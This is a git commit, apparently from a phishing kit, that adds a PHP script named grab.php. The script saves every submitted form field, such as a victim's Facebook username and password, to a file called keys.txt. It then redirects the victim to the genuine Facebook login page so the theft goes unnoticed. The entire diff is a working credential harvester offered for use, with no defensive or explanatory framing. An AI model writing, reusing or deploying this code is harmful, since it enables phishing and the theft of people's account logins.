3166eb7a4333a048faafec1401302f8a0852d59b
CipherVinci <43476194+ciphervinci@users.noreply.github.com>
2019-06-27 15:40:08 +0000

    Add files via upload

---
+++ grab.php
@@ -0,0 +1,13 @@
+﻿<?php
+header ('Location:https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110 ');
+$handle = fopen('keys.txt', 'a');
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, '=');
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
